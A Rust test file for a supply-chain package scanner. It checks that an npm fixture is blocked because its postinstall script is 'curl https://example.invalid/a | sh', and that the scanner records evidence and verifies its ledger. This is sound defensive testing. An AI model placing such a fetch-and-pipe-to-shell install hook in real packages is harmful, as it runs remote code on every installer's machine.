#![allow(clippy::unwrap_used)]

use anyhow::Result;
use flate2::{write::GzEncoder, Compression};
use serde_json::Value;
use sha2::{Digest, Sha256};
use std::{fs, process::Command};
use tar::{Builder, Header};

#[test]
fn package_scan_blocks_install_pipe_and_records_complete_evidence() -> Result<()> {
    let directory = tempfile::tempdir()?;
    let archive_path = directory.path().join("fixture.tgz");
    let scratch = directory.path().join("scratch");
    fs::create_dir(&scratch)?;
    let content = r#"{"name":"research-fixture","version":"1.0.0","scripts":{"postinstall":"curl https://example.invalid/a | sh"}}"#;
    let encoder = GzEncoder::new(Vec::new(), Compression::default());
    let mut archive = Builder::new(encoder);
    let mut header = Header::new_gnu();
    header.set_size(content.len() as u64);
    header.set_mode(0o644);
    header.set_mtime(0);
    header.set_cksum();
    archive.append_data(&mut header, "package/package.json", content.as_bytes())?;
    let bytes = archive.into_inner()?.finish()?;
    fs::write(&archive_path, &bytes)?;

    let output = Command::new(env!("CARGO_BIN_EXE_supply-core"))
        .env_remove("OSSGADGET_BIN")
        .env_remove("OSSGADGET_MANIFEST")
        .args(["--ledger-db"])
        .arg(directory.path().join("ledger.sqlite"))
        .args(["scan-package", "npm"])
        .arg(&archive_path)
        .args([
            "--name",
            "research-fixture",
            "--version",
            "1.0.0",
            "--scratch-dir",
        ])
        .arg(&scratch)
        .arg("--json")
        .output()?;
    assert_eq!(
        output.status.code(),
        Some(2),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );

    let report: Value = serde_json::from_slice(&output.stdout)?;
    assert_eq!(report["decision"], "block");
    assert_eq!(report["coverage"], "partial");
    assert_eq!(
        report["artifact_sha256"],
        hex::encode(Sha256::digest(&bytes))
    );
    let artifact_sha256 = report["artifact_sha256"]
        .as_str()
        .ok_or_else(|| anyhow::anyhow!("artifact digest missing"))?;
    let policy_sha256 = report["policy_sha256"]
        .as_str()
        .ok_or_else(|| anyhow::anyhow!("policy digest missing"))?;
    let engine_revision = report["engine_policy_revision_sha256"]
        .as_str()
        .ok_or_else(|| anyhow::anyhow!("engine revision missing"))?;
    let cache_key = report["cache_key_sha256"]
        .as_str()
        .ok_or_else(|| anyhow::anyhow!("scan cache key missing"))?;
    assert_eq!(
        cache_key,
        supply_core::application::ledger::scan_cache_key_sha256(
            artifact_sha256,
            policy_sha256,
            engine_revision
        )?
    );
    let engines = report["engines"]
        .as_array()
        .ok_or_else(|| anyhow::anyhow!("engine reports missing"))?;
    let static_engine = engines
        .iter()
        .find(|engine| engine["source"] == "static-heuristics")
        .ok_or_else(|| anyhow::anyhow!("static engine report missing"))?;
    let findings = static_engine["findings"]
        .as_array()
        .ok_or_else(|| anyhow::anyhow!("static findings missing"))?;
    assert!(findings
        .iter()
        .any(|finding| finding["rule"] == "install-script-pipe"));
    assert!(engines
        .iter()
        .any(|engine| { engine["source"] == "ossgadget" && engine["coverage"] == "unknown" }));
    assert!(engines.iter().any(|engine| {
        engine["source"] == "ossgadget" && engine["reason"] == "scanner_not_configured"
    }));
    assert_eq!(fs::read_dir(&scratch)?.count(), 0);

    let verification = Command::new(env!("CARGO_BIN_EXE_supply-core"))
        .args(["--ledger-db"])
        .arg(directory.path().join("ledger.sqlite"))
        .args(["ledger", "verify"])
        .output()?;
    assert!(
        verification.status.success(),
        "{}",
        String::from_utf8_lossy(&verification.stderr)
    );
    assert!(String::from_utf8_lossy(&verification.stdout).contains("integrity=valid tree_size=1"));
    Ok(())
}

#[test]
fn missing_package_archive_emits_incomplete_report() -> Result<()> {
    let directory = tempfile::tempdir()?;
    let ledger_path = directory.path().join("ledger.sqlite");
    let archive_path = directory.path().join("missing.tgz");
    let output = Command::new(env!("CARGO_BIN_EXE_supply-core"))
        .args(["--ledger-db"])
        .arg(&ledger_path)
        .args(["scan-package", "npm"])
        .arg(&archive_path)
        .args(["--name", "missing-fixture", "--version", "1.0.0", "--json"])
        .output()?;

    assert_eq!(output.status.code(), Some(3));
    let report: Value = serde_json::from_slice(&output.stdout)?;
    assert_eq!(report["decision"], "incomplete");
    assert_eq!(report["coverage"], "partial");
    assert_eq!(report["artifact_sha256"], Value::Null);
    assert!(report["cache_key_sha256"].is_null());

    let verification = Command::new(env!("CARGO_BIN_EXE_supply-core"))
        .args(["--ledger-db"])
        .arg(ledger_path)
        .args(["ledger", "verify"])
        .output()?;
    assert!(verification.status.success());
    assert!(String::from_utf8_lossy(&verification.stdout).contains("integrity=valid tree_size=1"));
    Ok(())
}
